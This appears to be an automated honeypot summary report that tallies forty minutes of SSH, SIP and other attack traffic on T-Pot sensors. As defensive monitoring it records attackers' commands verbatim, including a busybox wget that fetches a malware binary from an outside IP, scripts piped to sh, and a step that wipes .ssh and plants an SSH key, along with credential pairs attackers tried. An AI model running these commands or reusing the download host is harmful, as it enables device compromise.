Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-27T02:01:32Z
**Timeframe:** 2025-10-27T01:20:01Z to 2025-10-27T02:00:01Z
**Files Used:**
- agg_log_20251027T012001Z.json
- agg_log_20251027T014002Z.json
- agg_log_20251027T020001Z.json

**Executive Summary**

This report summarizes 19,492 events collected from T-Pot honeypots over a 40-minute period. The majority of attacks were captured by the Cowrie, Sentrypeer, and Honeytrap honeypots. The most prominent attack vector was SSH, with significant activity also targeting SIP (Session Initiation Protocol). The IP address 198.23.190.58 was the most active attacker. A large number of attacks attempted to exploit CVE-2005-4050, a vulnerability related to SIP. Attackers were observed attempting to modify SSH authorized_keys files and download malicious payloads.

**Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 7102
- Sentrypeer: 3673
- Honeytrap: 3449
- Suricata: 2867
- Ciscoasa: 1927
- Dionaea: 94
- Mailoney: 117
- Adbhoney: 55
- H0neytr4p: 43
- Dicompot: 36
- Miniprint: 36
- Tanner: 43
- ConPot: 14
- Honeyaml: 17
- Redishoneypot: 14
- ElasticPot: 4
- Ipphoney: 1

**Top Attacking IPs:**
- 198.23.190.58: 2321
- 144.172.108.231: 1053
- 164.90.205.97: 549
- 185.243.5.148: 581
- 203.83.231.93: 431
- 14.103.198.33: 442
- 103.82.92.231: 445
- 185.243.5.158: 416
- 103.217.144.161: 299
- 137.184.179.27: 277

**Top Targeted Ports/Protocols:**
- 5060: 3673
- 22: 938
- UDP/5060: 782
- 5903: 130
- 5901: 120
- 8333: 119
- 25: 117
- TCP/22: 94
- 5905: 80
- 5904: 80

**Most Common CVEs:**
- CVE-2005-4050: 772
- CVE-2002-0013 CVE-2002-0012: 11
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 7
- CVE-2019-11500 CVE-2019-11500: 1
- CVE-1999-0183: 1

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password:
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.uhavenobotsxd...

**Signatures Triggered:**
- ET VOIP MultiTech SIP UDP Overflow (2003237)
- ET DROP Dshield Block Listed Source group 1 (2402000)
- ET SCAN MS Terminal Server Traffic on Non-standard Port (2023753)
- ET SCAN NMAP -sS window 1024 (2009582)
- ET HUNTING RDP Authentication Bypass Attempt (2034857)
- ET INFO Reserved Internal IP Traffic (2002752)
- ET CINS Active Threat Intelligence Poor Reputation IP
- ET DROP Spamhaus DROP Listed Traffic Inbound

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- root/Qq489449,
- oracle/Bscs@2024
- root/hosx6x
- root/houdenis
- demo/demo
- admin/!!!111
- jla/xurros22$
- systemd/Voidsetdownload.so

**Files Uploaded/Downloaded:**
- rondo.dtm.sh||busybox
- rondo.dtm.sh||curl
- rondo.dtm.sh)|sh
- arm.uhavenobotsxd
- arm5.uhavenobotsxd
- arm6.uhavenobotsxd
- arm7.uhavenobotsxd
- x86_32.uhavenobotsxd
- mips.uhavenobotsxd
- mipsel.uhavenobotsxd

**HTTP User-Agents:**
- No user-agent data was recorded in this timeframe.

**SSH Clients:**
- No SSH client data was recorded in this timeframe.

**SSH Servers:**
- No SSH server data was recorded in this timeframe.

**Top Attacker AS Organizations:**
- No attacker AS organization data was recorded in this timeframe.

**Key Observations and Anomalies**

- **High Volume of SSH Activity:** The Cowrie honeypot recorded the highest number of events, indicating a large volume of automated SSH brute-force attacks and command execution attempts.
- **SIP Scanning:** A significant number of events targeted SIP (Session Initiation Protocol) on port 5060, primarily triggering the "ET VOIP MultiTech SIP UDP Overflow" signature. This suggests widespread scanning for vulnerabilities in VoIP systems.
- **Repetitive Command Execution:** Attackers consistently attempted to execute a series of commands to enumerate system information (CPU, memory, etc.) and to modify the `.ssh/authorized_keys` file. This is a common tactic to maintain persistent access to a compromised system.
- **Malware Download Attempts:** There were multiple attempts to download and execute malicious binaries, such as `arm.uhavenobotsxd`, from a specific IP address (94.154.35.154). This indicates attempts to deploy malware on compromised devices.
- **Lack of Diversity in Attack Vectors:** The majority of attacks were focused on a few common protocols (SSH, SIP, RDP). This suggests that the attackers are using automated tools to scan for common vulnerabilities.
